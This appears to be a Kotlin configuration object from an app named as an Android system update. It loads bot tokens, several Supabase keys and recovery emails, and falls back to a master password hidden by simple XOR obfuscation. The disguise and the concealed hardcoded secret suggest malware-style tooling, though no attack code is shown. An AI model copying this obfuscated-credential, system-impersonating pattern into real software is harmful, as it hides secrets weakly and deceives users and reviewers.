package com.android.system.update.core

object SecureEnv {
    private const val MASK: Byte = 0x5A

    private fun decrypt(data: ByteArray): String =
        String(ByteArray(data.size) { i -> (data[i].toInt() xor MASK.toInt()).toByte() })

    val masterPass: String by lazy {
        System.getenv("MASTER_PASSWORD") ?: decrypt(byteArrayOf(
            0x00, 0x31, 0x35, 0x3E, 0x61, 0x62, 0x63, 0x10, 0x61, 0x62, 0x63, 0x10
        ))
    }

    val botTokens: List<String> by lazy {
        System.getenv("BOT_TOKENS")?.split(",") ?: emptyList()
    }

    val supabaseUrls: Map<String, String> by lazy {
        mapOf(
            "A" to (System.getenv("SUPABASE_URL_A") ?: ""),
            "B" to (System.getenv("SUPABASE_URL_B") ?: ""),
            "C" to (System.getenv("SUPABASE_URL_C") ?: ""),
            "D" to (System.getenv("SUPABASE_URL_D") ?: "")
        )
    }

    val supabaseKeys: Map<String, String> by lazy {
        mapOf(
            "A" to (System.getenv("SUPABASE_KEY_A") ?: ""),
            "B" to (System.getenv("SUPABASE_KEY_B") ?: ""),
            "C" to (System.getenv("SUPABASE_KEY_C") ?: ""),
            "D" to (System.getenv("SUPABASE_KEY_D") ?: "")
        )
    }

    val recoveryEmails: List<String> by lazy {
        System.getenv("RECOVERY_EMAILS")?.split(",") ?: emptyList()
    }

    val maxAttempts: Int by lazy {
        System.getenv("MAX_ATTEMPTS")?.toIntOrNull() ?: 5
    }
}